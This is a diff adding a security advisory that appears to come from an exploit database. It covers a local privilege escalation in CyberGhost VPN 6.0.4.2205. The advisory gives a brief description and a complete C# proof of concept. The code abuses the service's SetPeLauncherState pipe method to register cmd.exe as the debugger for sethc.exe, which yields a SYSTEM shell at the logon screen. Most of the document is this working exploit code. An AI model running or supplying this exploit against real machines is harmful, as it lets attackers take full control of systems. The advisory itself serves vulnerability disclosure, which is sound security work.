@@ -1,0 +1,38 @@
+# Exploit CyberGhost 6.0.4.2205 Privilege Escalation
+# Date: 06.03.2017
+# Software Link: http://www.cyberghostvpn.com/
+# Exploit Author: Kacper Szurek
+# Contact: https://twitter.com/KacperSzurek
+# Website: https://security.szurek.pl/
+# Category: local
+  
+1. Description
+ 
+`CG6Service` service has method `SetPeLauncherState` which allows launch the debugger automatically for every process we want.
+
+https://security.szurek.pl/cyberghost-6042205-privilege-escalation.html
+
+2. Proof of Concept
+
+using System;
+using CyberGhost.Communication;
+
+namespace cyber
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("CyberGhost 6.0.4.2205 Privilege Escalation");
+            Console.WriteLine("by Kacper Szurek");
+            Console.WriteLine("http://security.szurek.pl/");
+            Console.WriteLine("https://twitter.com/KacperSzurek");
+            PeLauncherOptions options = new PeLauncherOptions();
+            options.ExecuteableName = "sethc.exe";
+            options.PeLauncherExecuteable = @"c:\Windows\System32\cmd.exe";
+            EventSender CyberGhostCom = CyberGhostCom = new EventSender("CyherGhostPipe");
+            CyberGhostCom.SetPeLauncherState(options, PeLauncherOperation.Add);
+            Console.WriteLine("Now logout and then press SHIFT key 5 times");
+        }
+    }
+}
